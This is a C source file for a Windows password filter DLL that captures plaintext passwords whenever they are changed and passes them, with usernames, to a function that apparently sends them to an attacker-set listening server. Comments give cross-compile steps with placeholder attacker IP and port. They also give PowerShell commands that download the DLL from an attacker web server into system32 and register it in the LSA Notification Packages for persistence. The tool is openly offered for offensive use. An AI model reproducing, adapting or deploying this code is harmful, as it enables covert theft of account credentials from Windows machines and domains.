// Windows Password Filter
// Captures Raw plaintext passwords when changed.
// C DLL for yall scrubs.
//
// Compile:
//  env GOOS=windows CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -v -x -buildmode=c-archive filter.go
//  x86_64-w64-mingw32-gcc -c -o "filter.o" filter.c -fPIC -pthread -lwinmm -lntdll -lws2_32 -DSERVER='"<yourlistenip>:<listenport>"'
//  x86_64-w64-mingw32-gcc -o filter.dll -s -shared filter.o filter.a -fPIC -pthread -lwinmm -lntdll -lws2_32 -DSERVER='"<yourlistenip>:<listenport>"'
//  rm -f filter.o
//  rm -f filter.h
//  rm -f filter.a
//
// Install With
//  powershell -com "$a=New-Object System.Net.WebClient; $a.DownloadFile('http://<webserver>/filter.dll', 'C:\Windows\system32\idk.dll');"
//  powershell -con "$b=(Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'Notification Packages').'Notification Packages'; Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'Notification Packages' -Value ""$b`r`nidk"""
//  Reboot the box
//  ??
//  Profit!
//
// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#define _WIN32_WINNT 0x0501

#include "filter.h"
#include <windows.h>
#include <ntsecapi.h>

CRITICAL_SECTION cs;

void _() {
    HaGotEm(NULL, 0, NULL, 0, NULL);
}
__declspec(dllexport) BOOL NTAPI InitializeChangeNotify(void) { return TRUE; }

BOOL WINAPI DllMain(HINSTANCE hiDLL, DWORD dwReason, LPVOID lpReserved) { return TRUE; }

__declspec(dllexport) NTSTATUS NTAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword) {
    EnterCriticalSection(&cs);
    HaGotEm(SERVER, UserName->Length, (char*)(UserName->Buffer), NewPassword->Length, (char*)(NewPassword->Buffer));
    LeaveCriticalSection(&cs);
    return 0;
}
__declspec(dllexport) BOOL NTAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOL SetOperation) {
    HaGotEm(SERVER, AccountName->Length, (char*)(AccountName->Buffer), Password->Length, (char*)(Password->Buffer));
    return TRUE;
}
